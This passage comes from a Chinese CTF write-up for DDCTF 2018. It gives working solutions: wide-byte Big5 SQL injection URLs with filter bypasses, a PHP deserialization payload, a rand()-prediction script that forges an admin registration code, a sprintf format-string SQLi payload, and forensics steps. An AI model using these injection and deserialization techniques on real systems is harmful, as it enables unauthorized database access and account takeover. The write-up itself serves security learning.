Cipher.getInstance(key.getAlgorithm());\n        cipher.init(2, key);\n        String flag = \"019312D7231329ADEB986C6F994D7148B74AF9282B515F80F58A88BCE863F8848600CA69C4BE8F0D3BE3486B4FB7445C15169085F1DFE4D4B8439EF3472B50DE22D6E09BCCBC56542541D0C8F148B658005C2DD89202AEBF765998C2FA6AA197E5F6277587E78498F7E0A111429D3E1BEE2F4DD17224C0599FFA2FC1EE69B2521EEB96859EEB3D65DA88FED274739B208A81AF6280CF233B2064C6DB513AB9D53B010A456B8073C8C950E29034628C957108E7173390FBB4665229A6A9949188C8A5D43AE7CDB6244F082EF90EB3D2E126764CF90DE716A2150652AE3C13C0B457BD76E9BF1F9936AD85474CEDB23472039B5EC3387EF4FB5D5E3BD0FA681CDE\";\n        byte[] data = cipher.doFinal(hexStringToBytes(flag));\n        System.out.println(new String(data));\n    }\n\n    public static String byte2hex(byte[] b) {\n        StringBuilder hs = new StringBuilder();\n\n        for(int n = 0; b != null && n < b.length; ++n) {\n            String stmp = Integer.toHexString(b[n] & 255);\n            if(stmp.length() == 1) {\n                hs.append('0');\n            }\n\n            hs.append(stmp);\n        }\n\n        return hs.toString().toUpperCase();\n    }\n\n    public static byte[] hexStringToBytes(String hexString) {\n        if (hexString == null || hexString.equals(\"\")) {\n            return null;\n        }\n        hexString = hexString.toUpperCase();\n        int length = hexString.length() / 2;\n        char[] hexChars = hexString.toCharArray();\n        byte[] d = new byte[length];\n        for (int i = 0; i < length; i++) {\n            int pos = i * 2;\n            d[i] = (byte) (charToByte(hexChars[pos]) << 4 | charToByte(hexChars[pos + 1]));\n        }\n        return d;\n    }\n\n    private static byte charToByte(char c) {\n        return (byte) \"0123456789ABCDEF\".indexOf(c);\n    }\n}\n```\n通过这几行代码就可以获得一个加密后的邮箱了,邮箱使用首页展示的邮箱就行。\n\n```\n//        String email = \"email\";\n//        SecretKeySpec signingKey = new SecretKeySpec(\"sdl welcome you !\".getBytes(), \"HmacSHA256\");\n//        Mac mac = Mac.getInstance(\"HmacSHA256\");\n//        mac.init(signingKey);\n//        byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());\n//        System.out.println(byte2hex(e));\n```\n拿到该加密后的邮箱，就可以获得加密后的flag。\n\n ![avatar](/assets/ddctf/20180421191047.png)\n\n拿到加密之后的flag之后，就可以解密了。\n\n```\npublic static void gencipher() throws Exception {\n        String p = \"sdl welcome you !\".substring(0, \"sdl welcome you !\".length() - 1).trim().replace(\" \", \"\");\n        String ksPath = \"D:\\\\java\\\\ddctf\\\\src\\\\main\\\\java\\\\sdl.ks\";\n        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n        FileInputStream inputStream = new FileInputStream(ksPath);\n        keyStore.load(inputStream, p.toCharArray());\n        Key key = keyStore.getCertificate(\"www.didichuxing.com\").getPublicKey();\n        Cipher cipher = Cipher.getInstance(key.getAlgorithm());\n        cipher.init(2, key);\n        String flag = \"019312D7231329ADEB986C6F994D7148B74AF9282B515F80F58A88BCE863F8848600CA69C4BE8F0D3BE3486B4FB7445C15169085F1DFE4D4B8439EF3472B50DE22D6E09BCCBC56542541D0C8F148B658005C2DD89202AEBF765998C2FA6AA197E5F6277587E78498F7E0A111429D3E1BEE2F4DD17224C0599FFA2FC1EE69B2521EEB96859EEB3D65DA88FED274739B208A81AF6280CF233B2064C6DB513AB9D53B010A456B8073C8C950E29034628C957108E7173390FBB4665229A6A9949188C8A5D43AE7CDB6244F082EF90EB3D2E126764CF90DE716A2150652AE3C13C0B457BD76E9BF1F9936AD85474CEDB23472039B5EC3387EF4FB5D5E3BD0FA681CDE\";\n        byte[] data = cipher.doFinal(hexStringToBytes(flag));\n        System.out.println(new String(data));\n    }\n```\n该加密是RSA加密，需要拿到公钥才行，公钥的话，只需要通过以下代码就可\n\n```\nString ksPath = \"D:\\\\java\\\\ddctf\\\\src\\\\main\\\\java\\\\sdl.ks\";\nKeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\nFileInputStream inputStream = new FileInputStream(ksPath);\nkeyStore.load(inputStream, p.toCharArray());\nKey key = keyStore.getCertificate(\"www.didichuxing.com\").getPublicKey();\n```\n然后就可以解密得到flag.\n> DDCTF{5218295657878818503}\n\n# 注入的奥妙\n## sql注入\n首先，测试单引号，双引号，会发现均会被转义，然后%df，直接就没反应了，过了一会，输了一个中文的单引号\"‘\"，发现输出竟然乱码。\n\n ![avatar](/assets/ddctf/20180421195946.png)\n\n 然后就输入了几个中文，发现还是乱码，只有输入英文才没有乱码，应该是后台进行了编码转换。\n\n ![avatar](/assets/ddctf/20180421200130.png)\n\n 于是便测试了一下是什么编码，经过测试，发现是Big5编码，后来发现题目在源码里边给出了提示链接（https://wenku.baidu.com/view/bd29b7b3fd0a79563c1e72f7.html)可惜做题时没看到。\n\n ![avatar](/assets/ddctf/20180421200307.png)\n\n 我选择了\"么\"\n\n ![avatar](/assets/ddctf/20180421200748.png)\n\n通过测`http://116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/well/getmessage/%E4%B9%88`，可以看到单引号成功逃逸。\n\n```\n 最后拼接的参数是 : ?\\\\'\n~~~如果自己拼接的参数显示有问题了，试试浏览器的页面编码设置~~~\n很遗憾没有找到数据 可以试试别的 ！\n42000 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''?\\\\''' at line 1\n```\n单引号成功逃逸，然后就是简单的sql注入获取数据了，报错注入或者直接获取数据均可，还是手工,这里需要注意，部分字符串被过滤，只要双写绕过就行，同时由于编码的原因，直接获取数据的话，会报错编码有问题，我感觉应该就是这原因，出题人把错误展示出来了，需要编码不同的地方添加\"collate utf8_general_cli\",强制转换编码即可。\n\n* 获取数据库。\n\n   `http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1%E4%B9%88'%20uniunionon%20select%201,2,extracextractvaluetvalue(1,%20concat(0x3a,%20dadatabasetabase(),%200x3a))%23  `\n\n   得到结果\"sqli\"\n\n* 获取'sqli'下的table。\n\n   `http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么' uniunionon select 1,2,extracextractvaluetvalue(1, concat(0x3a, (select group_concat(table_name) COLLATE utf8_general_ci from information_schema.tables where table_schema=0x73716c69), 0x3a))%23 `\n   得到结果\"message,route_rules\"\n\n* 获取\"route_rules\"的列名。\n\n* `http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么' uniunionon select 1,2,extracextractvaluetvalue(1, concat(0x3a, (select group_concat(column_name) COLLATE utf8_general_ci from information_schema.tables where table_schema=0x73716c69), 0x3a))%23` \n   得到结果\"id,pattern,action,rulepass\"\n\n* 然后获取route_rules表中的数据。\n   数据如下:  \n   1   get*/   u/well/getmessage/   \n   12  get*/   u/justtry/self/  \n   13  post*/  u/justtry/try  \n   15  static/bootstrap/css/backup.css static/bootstrap/css/backup.zip\n\n## 代码审计\n通过上边的`116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/static/bootstrap/css/backup.css`，可以拿到代码。\n\n+ Jusstry.php\n\n```\npublic function try($serialize)\n{\n    unserialize(urldecode($serialize), [\"allowed_classes\" => [\"Index\\Helper\\Flag\", \"Index\\Helper\\SQL\",\"Index\\Helper\\Test\"]]);\n}\n```\n通过这段代码，可以看到使用了unserialize()方法，可能存在反序列化漏洞。\n\n+ Flag.php\n\n```\n<?php\nnamespace Index\\Helper;\n\nuse PDO;\nuse Index\\Helper\\SQL;\n\ndefined('ACCESS_FILE') or exit('No direct script access allowed');\nclass Flag\n{\n    public $sql;\n\n    //\n    public function __construct()\n    {\n        $this->sql=new SQL();\n    }\n\n    //\n    public function get($user)\n    {\n\n        $tmp=$this->sql->FlagGet($user);\n        if ($tmp['status']===1) {\n            return $this->sql->FlagGet($user)['flag'];\n        }\n    }\n}\n\n```\n该类说明只要调用get方法就可以得到指定用户的flag。\n\n+ Test.php\n\n```\nclass Test\n{\n\n    public $user_uuid = \"4f5aa917-e388-4aa5-bcdc-125b9b95e12a\";\n    public $fl;\n\n    public function __construct()\n    {\n        echo 'hhkjjhkhjkhjkhkjhkhkhk';\n        $this->fl = new Flag();\n    }\n\n    public function __destruct()\n    {\n        $this->getflag('ctfuser', $this->user_uuid);\n    }\n\n    public function setflag($m = 'ctfuser', $u = 'default', $o = 'default')\n    {\n        $user=array(\n            'name' => $m,\n            'oldid' => $o,\n            'id' => $u\n        );\n        // var_dump($user);\n\n        echo $this->fl->set($user, 2);\n    }\n\n    public function getflag($m = 'ctfuser', $u = 'default')\n    {\n        //TODO: check username\n        $user=array(\n            'name' => $m,\n            'id' => $u\n        );\n        //懒了直接输出给你们了\n        echo 'DDCTF{'.$this->fl->get($user).'}';\n    }\n}\n```\n在Test类中，可以看到调用了__destruct()方法，并且该方法调用了getflag方法。这样，只需要构造一个Test类，并令$f1=new Flag(),$user_uuid=\"4f5aa917-e388-4aa5-bcdc-125b9b95e12a\"，然后序列化，然后就可以获得flag了，需要注意的是，Flag.php中的$sql也是需要赋值的。\n\n```\n<?php\nnamespace Index\\Helper;\n\nuse Index\\Helper\\Flag;\nuse Index\\Helper\\UUID;\n\nclass SQL\n{\n    public $dbc;\n    public $pdo;\n\n    //\n    public function __construct()\n    {\n    }\n}\n\nclass Flag\n{\n    public $sql;\n\n    //\n    public function __construct()\n    {\n        $this->sql=new SQL();\n    }\n}\n\n\n// defined('ACCESS_FILE') or exit('No direct script access allowed');\nclass Test\n{\n\n    public $user_uuid = \"4f5aa917-e388-4aa5-bcdc-125b9b95e12a\";\n    public $fl;\n\n    public function __construct()\n    {\n        echo 'hhkjjhkhjkhjkhkjhkhkhk';\n        $this->fl = new Flag();\n    }\n\n    public function __destruct()\n    {\n        // $this->getflag('ctfuser', $this->user_uuid);\n    }\n}\n\necho serialize(new Test());\n```\n即可得到序列化之后的值:\"hhkjjhkhjkhjkhkjhkhkhkO:17:\"Index\\Helper\\Test\":2:{s:9:\"user_uuid\";s:36:\"4f5aa917-e388-4aa5-bcdc-125b9b95e12a\";s:2:\"fl\";O:17:\"Index\\Helper\\Flag\":1:{s:3:\"sql\";O:16:\"Index\\Helper\\SQL\":2:{s:3:\"dbc\";N;s:3:\"pdo\";N;}}}\",然后就可以得到flag了。\n\n ![avatar](/assets/ddctf/20180421150038.png)\n\n# mini blockchain\n## 构造符合条件的区块\n```\nimport json\nimport hashlib\nfrom itertools import product\nimport string\nfrom functools import reduce\nimport rsa\n\nEMPTY_HASH = '0' * 64\n\ndef hash(x):\n    return hashlib.sha256(hashlib.md5(x.encode()).digest()).hexdigest()\n\n\ndef hash_reducer(x, y):\n    return hash(hash(x) + hash(y))\n\n\ndef hash_block(block):\n    return reduce(hash_reducer, [block['prev'], block['nonce'],\n                                 reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)])\n\nblock = {\n    \"nonce\": \"6h0F\",\n    \"prev\": \"0000031ffd8d820cfaef0a73a76dabee62cfce8922e929df101eba4d2c400be8\",\n    \"transactions\": []\n  }\n\nc = string.ascii_lowercase + \"0123456789ABCDEFGHI\"\n\ncaptchas = [''.join(i) for i in product(c, repeat=4)]\n\nprint('[+] Genering {} captchas...'.format(len(captchas)))\nwith open('captchas.txt', 'w') as f:\n    for k in captchas:\n        block[\"nonce\"] = k\n        f.write(hash_block(block)[:5] + ' --> ' + k + '\\n')\n```\n\"nonce\"值是可控的，所有只要有修改nonce就可以生成任意的符合条件的区块。\n\n## 解题\n初始区块链如图所示:\n\n ![avatar](/assets/ddctf/20180421221550.png)\n\n然后，通过find_block_chain_tail方法，可以知道，该区块链是根据block['height']来判断最后一个区块链，如果构造一个更长的区块链，那么就可以控制整个区块链。\n\n```\ndef find_blockchain_tail():\n    return max(session['blocks'].values(), key=lambda block: block['height'])\n```\n\n ![avatar](/assets/ddctf/20180421222032.png)\n\n从上边的图可以看到，如果构造3个区块，（事实上，也有一定的概率，创建两个区块就行了），那么最后一个区块就是区块6，这时候，一切都回到起点，银行又有了1000000，然后就可以转账，转账之后，在创建一个区块，就可以拿到第一个钻石,如图所示。\n\n ![avatar](/assets/ddctf/20180421222814.png)\n\n接下来，来获取第二个钻石。这时候，只需要在区块7之后继续创建空的区块就行了。这样，shop又有了1000000，又可以买一个钻石，然后就可以拿到flag了。\n\n ![avatar](/assets/ddctf/20180421223014.png)\n\n需要注意的是，flask是客户端session，区块多了之后，cookie也会变得很大，由于浏览器cookie是有限制的，这样，当set-cookie的值过大的时候，就会出现set-cookie失败的情况，所以这道题最好使用脚本发包。\n\n# 我的博客\n## 审计代码\n根据提示，下载www.tar.gz,里边共有三个文件，index.php, login.php, register.php。\n### index.php\n\n```php\nif(isset($_GET['id'])){\n    $id = addslashes($_GET['id']);\n    if(isset($_GET['title'])){\n        $title = addslashes($_GET['title']);\n        $title = sprintf(\"AND title='%s'\", $title);\n    }else{\n        $title = '';\n    }\n    $sql = sprintf(\"SELECT * FROM article WHERE id='%s' $title\", $id);\n\n    foreach ($pdo->query($sql) as $row) {\n        echo \"<h1>\".$row['title'].\"</h1><br>\".$row['content'];\n        die();\n    }\n}\n```\n可以看到该地方使用了两次sprintf，可以立马想到[从WordPress SQLi谈PHP格式化字符串问题](https://paper.seebug.org/386/),问题就是，需要以admin的身份登录。\n\n### login.php\n\n```\nif($_SERVER['REQUEST_METHOD'] === \"POST\") {\n    if(!(isset($_POST['csrf']) and (string)$_POST['csrf'] === $_SESSION['csrf'])) {\n        die(\"CSRF token error!\");\n    }\n\n    $username = (isset($_POST['username']) === true && $_POST['username'] !== '') ? (string)$_POST['username'] : die('Missing username');\n    $password = (isset($_POST['password']) === true && $_POST['password'] !== '') ? (string)$_POST['password'] : die('Missing password');\n\n    if (strlen($username) > 32 || strlen($password) > 32) {\n        die('Invalid input');\n    }\n\n    $sth = $pdo->prepare('SELECT password FROM users WHERE username = :username');\n    $sth->execute([':username' => $username]);\n\n    if ($sth->fetch()[0] !== $password) {\n        die('wrong password');\n    }\n\n    $sth = $pdo->prepare('SELECT `identity` FROM users WHERE username = :username');\n    $sth->execute([':username' => $username]);\n\n    if ($sth->fetch()[0] === \"admin\") {\n        $_SESSION['is_admin'] = true;\n    } else {\n        $_SESSION['is_admin'] = false;\n    }\n\n    #echo $username;\n    header(\"Location: index.php\");\n}\n```\nlogin部分使用pdo进行查询，并且字符串之间的比较也是\"===\"，不可能存在任何漏洞。\n\n### register.php\n\n```\nif(!(isset($_POST['csrf']) and (string)$_POST['csrf'] === $_SESSION['csrf'])) {\n        die(\"CSRF token error!\");\n    }\n    \n    $admin = \"admin###\" . substr(str_shuffle('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, 32);\n    $username = (isset($_POST['username']) === true && $_POST['username'] !== '') ? (string)$_POST['username'] : die('Missing username');\n    $password = (isset($_POST['password']) === true && $_POST['password'] !== '') ? (string)$_POST['password'] : die('Missing password');\n    $code = (isset($_POST['code']) === true) ? (string)$_POST['code'] : '';\n    if (strlen($username) > 32 || strlen($password) > 32) {\n        die('Invalid input');\n    }\n\n    $sth = $pdo->prepare('SELECT username FROM users WHERE username = :username');\n    $sth->execute([':username' => $username]);\n\n    if ($sth->fetch() !== false) {\n        die('username has been registered');\n    }\n\n    if($code === $admin) {\n        $identity = \"admin\";\n    } else {\n        $identity = \"guest\";\n    }\n\n    $sth = $pdo->prepare('INSERT INTO users (username, password, `identity`) VALUES (:username, :password, :identity)');\n    $sth->execute([':username' => $username, ':password' => $password, ':identity' => $identity]);\n\n    echo '<script>alert(\"register success\");location.href=\"./login.php\"</script>';\n} else {\n```\n\nregister部分，使用str_shuffle生成admin密码，同时给出rand()来作为csrf值。\n\n```\n<input type=\"hidden\" name=\"csrf\" id=\"csrf\" value=\"<?php $_SESSION['csrf'] = (string)rand();echo $_SESSION['csrf']; ?>\" required>\n<label for=\"inputUsername\" class=\"sr-only\">Username</label>\n```\n\n可以想到乌云的一篇文章，也是翻译自国外，原文可以自己找[Web应用隐形后门的设计与实现](https://wooyun.js.org/drops/Web%E5%BA%94%E7%94%A8%E9%9A%90%E5%BD%A2%E5%90%8E%E9%97%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0.html)。这样的话，就可以明确思路，首先通过预测rand()值，来预测密码，在使用该密码注册一个账号，进入博客，然后通过sprintf格式化漏洞获取flag。\n\n## 解题\n现在关键就是预测rand()值，通过google，可以找到0ctf2016,有相似的题目，[http://www.vuln.cn/6004](http://www.vuln.cn/6004),文中提到，只要有大于等于32个连续的rand()随机数，就可以大概预测接下来rand()的值。\n\n```\n#!php\nstate[i] = state[i-3] + state[i-31]\nreturn state[i] % 2147483648\n```\n\n同时，需要知道一定要使用 requests.session来keep-alive，否则的话，获得的rand()值并不是连续的，也就不满足上面的公式了。\n\n此外，在获得超过32个rand()值之后，并预测到接下来的62个rand()之后，还需要重新实现str_shuffle函数。通过阅读php源码，可以找到str_shuffle函数的实现。\n\n```\nstatic void php_string_shuffle(char *str, long len TSRMLS_DC) /* {{{ */\n{\n\tlong n_elems, rnd_idx, n_left;\n\tchar temp;\n\t/* The implementation is stolen from array_data_shuffle       */\n\t/* Thus the characteristics of the randomization are the same */\n\tn_elems = len;\n\n\tif (n_elems <= 1) {\n\t\treturn;\n\t}\n\n\tn_left = n_elems;\n\n\twhile (--n_left) {\n\t\trnd_idx = php_rand(TSRMLS_C);\n\t\tRAND_RANGE(rnd_idx, 0, n_left, PHP_RAND_MAX);\n\t\tif (rnd_idx != n_left) {\n\t\t\ttemp = str[n_left];\n\t\t\tstr[n_left] = str[rnd_idx];\n\t\t\tstr[rnd_idx] = temp;\n\t\t}\n\t}\n}\n\n```\n其中RAND_RANGE函数的实现如下:\n\n```\n#define RAND_RANGE(__n, __min, __max, __tmax) \\\n(__n) = (__min) + (long) ((double) ( (double) (__max) - (__min) + 1.0) * ((__n) / ((__tmax) + 1.0)))\n\n```\n准备工作就绪，就可以编写代码了。\n代码如下:\n\n```\nimport requests\nfrom lxml import etree\n\nurl = \"http://116.85.39.110:5032/2ae51a1981cbbdef618d3c46af6199cb/register.php\"\n\ndata = {\n    'username': 'dida',\n    'password': 'dida',\n    'csrf': '2086003527',\n    'code': ''\n}\n\ndef get_csrf(html):\n    html = etree.HTML(html)\n    token = html.xpath('//*[@id=\"csrf\"]')[0].get('value')\n    return token\n\n\ndef rand_range(rand, n_left):\n     return int((n_left + 1.0) * (rand / (2147483648.0)))\n\n\ndef shuffle(calc_rand):\n    str = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n    str_temp = list(str)\n    str_len = len(str_temp)\n    n_left = str_len - 1\n    temp = \"\"\n    while n_left:\n        randdata = calc_rand[61 - n_left]\n        index = rand_range(randdata, n_left)\n        if index != n_left:\n            temp = str_temp[n_left]\n            str_temp[n_left] = str_temp[index]\n            str_temp[index] = temp\n        n_left = n_left - 1\n\n    return \"\".join(str_temp)\n\nwhile 1:\n    s = requests.session()\n    l = []\n    for i in range(33):\n        res = s.get(url)\n        token = get_csrf(res.content)\n        l.append(token)\n\n    calc_rand = []\n    temp_calc_rand = []\n    for i in range(33, 95):\n        value = (int(l[i - 31]) + int(l[i-3])) % 2147483648\n        l.append(value)\n        temp_calc_rand.append(value)\n\n    str = \"admin###\" + shuffle(temp_calc_rand)[0:32]\n    data['code'] = str\n    data['csrf'] = l[32]\n\n    res = s.post(url = url, data = data)\n    print(res.content)\n    break\n```\n运行上边的代码，就可以注册一个账号，至于该账号是不是admin,多试几次总会成功。\n\n登陆之后，就可以使用sprintf字符串格式化漏洞来进行sql注入。这个就不在赘述了。\n基本的payload如下:\n>http://116.85.39.110:5032/2ae51a1981cbbdef618d3c46af6199cb/index.php?id=%1$&title=%1$' or 2=1 union select 1,2,3%23\n\n最后得到flag: ```DDCTF{9b7ccc1e96387b5ce079adab2fb08022}```\n\n","slug":"ddctf","published":1,"updated":"2018-08-06T12:16:43.877Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12gv0009qkdljibanjtf","content":"<h1 id=\"签到题目\"><a href=\"#签到题目\" class=\"headerlink\" title=\"签到题目:\"></a>签到题目:</h1><p>复制，粘贴</p>\n<h1 id=\"╯°□°）╯︵-┻━┻\"><a href=\"#╯°□°）╯︵-┻━┻\" class=\"headerlink\" title=\"(╯°□°）╯︵ ┻━┻\"></a>(╯°□°）╯︵ ┻━┻</h1><p>题目给了一个字符串<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1b2e2e5e2b5b4e4b8b7e6e1e1b6b9e4b5e3b8b1b1e3e5b5b6b4b1b0e4e6b2fd</span><br></pre></td></tr></table></figure></p>\n<p>首先，应该想到两两一组，一组代表一个字符，考虑到DDCTF，”DD”两个字符，在字符串中找到两组相邻的字符串，找到了”c4c4”和”e1e1”：</p>\n<p>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0<b>c4c4</b>c3d4c6fbb9e1b2e2e5e2b5b4e4b8b  7e6<b>e1e1</b>b6b9e4b5e3b8b1b1e3e5b5b6b4b1b0e4e6b2fd</p>\n<p>进一步分析可知，<b>c4</b>和<b>c3</b>刚好相差1，而<b>D</b>和<b>C</b>的ascii值也相差1，<b>c4c4</b>应该就表示”DD”, 然后以此类推：</p>\n<p><img src=\"/assets/ddctf/20180420150038.png\" alt=\"avatar\"></p>\n<h1 id=\"第四扩展FS\"><a href=\"#第四扩展FS\" class=\"headerlink\" title=\"第四扩展FS\"></a>第四扩展FS</h1><ol>\n<li>下载下来是一张图片</li>\n</ol>\n<p>首先: <code>binwalk windows.jpg</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">security:/mnt/c/Users/HT/Desktop/ddctf$ binwalk windows.jpg</span><br><span class=\"line\"></span><br><span class=\"line\">DECIMAL         HEX             DESCRIPTION</span><br><span class=\"line\">-------------------------------------------------------------------------------------------------------</span><br><span class=\"line\">30              0x1E            TIFF image data, big-endian</span><br><span class=\"line\">2871992         0x2BD2B8        LZMA compressed data, properties: 0x01, dictionary size: 2097152 bytes, uncompressed size: 134217728 bytes</span><br><span class=\"line\">7236510         0x6E6B9E        Zip archive data, at least v2.0 to extract, compressed size: 20430, uncompressed size: 33350, name: &quot;file.txt&quot;</span><br><span class=\"line\">7257054         0x6EBBDE        End of Zip archive</span><br><span class=\"line\"></span><br><span class=\"line\">Progress: 81.81% (10890274 / 13310878)</span><br></pre></td></tr></table></figure>\n<p>可以看到图片里边有个压缩包。<br>这时候，可以使用<code>dd</code>或者<code>foremost</code>命令，来分离压缩包。</p>\n<blockquote>\n<p>dd if=windows.jpg of=temp.zip skip=7236510 count=20544 bs=1<br>foremost windows.jpg</p>\n</blockquote>\n<p>得到一个压缩包，然后，查看图片属性，会在详细信息-&gt;备注里看到一个字符串”Pactera”，估计就是密码。</p>\n<ol start=\"2\">\n<li>然后打开file.txt</li>\n</ol>\n<p><img src=\"/assets/ddctf/20180420151247.png\" alt=\"avatar\"><br>可以看到有很多乱序字符，结合题目的提示，<b>日常违规审计中频次有时候非常重要</b>,可以统计一下每个字符串的个数，并排序。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep -o . file.txt | sort |uniq -c | sort -rn</span><br></pre></td></tr></table></figure>\n<p><img src=\"/assets/ddctf/20180420151941.png\" alt=\"avatar\"></p>\n<p>然后从新组合一下，就得到flag了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DDCTF&#123;ZuozHengqU3dEshi&#125;</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h1 id=\"流量分析\"><a href=\"#流量分析\" class=\"headerlink\" title=\"流量分析\"></a>流量分析</h1><p>这道题，花了我很长时间，直到ddctf快结束，才做出来，可以说完全被Fl-g.zip和sqlmap.zip绕进去了，气的我都想打我自己。<br>过程如下:<br>首先大体上浏览整个数据包，会发现，大体上就是3个部分:  </p>\n<ul>\n<li>ftp 发送了两个zip,Fl-g.zip和sqlmap.zip,传了一大堆数据  </li>\n<li>邮件相关的数据包</li>\n<li>https相关的包，由于只有几个，竟然被我选择性忽略了。</li>\n</ul>\n<h2 id=\"ftp之Fl-g-zxip\"><a href=\"#ftp之Fl-g-zxip\" class=\"headerlink\" title=\"ftp之Fl-g.zxip\"></a>ftp之Fl-g.zxip</h2><blockquote>\n<p>tcp.stream eq 2004   </p>\n</blockquote>\n<p>右键follow tcp流，保存数据，发现只有119kb，解压也提示包损坏，要密码，最终也没啥结果。</p>\n<p>然后，感觉应该是follow tcp流，没有得到所有的数据，于是，使用:</p>\n<blockquote>\n<p>tcp.stream eq 2004 &amp;&amp; ftp-data</p>\n</blockquote>\n<p>得到Fl-g.zip相关的数据包,另存为flag.pcap，然后编写代码，一个一个的拼接数据。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from scapy.all import * </span><br><span class=\"line\">pcaps = rdpcap(&quot;flag.pcap&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">fp = open(&quot;flag.zip&quot;, &quot;wb&quot;)</span><br><span class=\"line\">length = 0</span><br><span class=\"line\">for pcap in pcaps:</span><br><span class=\"line\">    value = pcap[&apos;Raw&apos;].original</span><br><span class=\"line\">    length += len(value)</span><br><span class=\"line\">    fp.write(value)</span><br><span class=\"line\">print(length)</span><br><span class=\"line\">fp.close()</span><br></pre></td></tr></table></figure>\n<p>得到13M大小的flag.zip,通过一番操作，尝试了密码爆破，伪加密，压缩包修复，来来回回折腾了几遍，最终，使用7-zip，密码:zhangsan，竟然解压得到了一个类似于mp4格式的文件，不知道这玩意和qr-code.jpg有什么关系，还没办法播放。主要原因，还是Fl-g.zip缺失了大量的数据，在明知缺失大量数据的情况下，感觉应该立即放弃，不过这压缩包名字实在太忽悠，折腾了3,4天我才放弃，浪费我大量时间。</p>\n<h2 id=\"ftp之sqlmap-zip\"><a href=\"#ftp之sqlmap-zip\" class=\"headerlink\" title=\"ftp之sqlmap.zip\"></a>ftp之sqlmap.zip</h2><blockquote>\n<p>tcp.stream eq 2005</p>\n</blockquote>\n<p>既然给了这个压缩包，感觉应该会有点用（实际上:一点用没有）,首先，follow tcp流，只有163kb，于是和Fl-g.zip一样,过滤:</p>\n<blockquote>\n<p>tcp.stream eq 2004 &amp;&amp; ftp-data</p>\n</blockquote>\n<p>得到sqlmap.zip相关的数据包,另存为sqlmap.pcap，然后编写代码，一个一个的拼接数据。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from scapy.all import * </span><br><span class=\"line\">pcaps = rdpcap(&quot;sqlmap.pcap&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">fp = open(&quot;sqlmap.zip&quot;, &quot;wb&quot;)</span><br><span class=\"line\">length = 0</span><br><span class=\"line\">for pcap in pcaps:</span><br><span class=\"line\">    value = pcap[&apos;Raw&apos;].original</span><br><span class=\"line\">    length += len(value)</span><br><span class=\"line\">    fp.write(value)</span><br><span class=\"line\">print(length)</span><br><span class=\"line\">fp.close()</span><br></pre></td></tr></table></figure>\n<p>得到了一个sqlmap.zip，第一次打开，用winrar，点击工具-&gt;修复压缩文件，修复一下。然后，爆破，伪加密，又搞了一遍，我都不知道我哪来的耐心。最后，想到已知明文攻击。</p>\n<p>已知明文攻击: 已知明文攻击要求加密的压缩包和非加密的压缩包里有相同的文件，并且文件的crc32值要相同，然后就可以使用archpr这个软件进行已知明文攻击。</p>\n<p>然后，去github.com下载最新版本的sqlmap,发现文件的crc32值并不相同，需要下载sqlmap1.1.10.zip才行。最后，解压sqlmap.zip得到的文件和sql1.1.10.zip里的文件一模一样，没有一点有用的东西。</p>\n<h2 id=\"邮件部分\"><a href=\"#邮件部分\" class=\"headerlink\" title=\"邮件部分\"></a>邮件部分</h2><p>通过follow tcp流，当tcp.stream eq 2016的时候，会看到有一个image001图片:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span 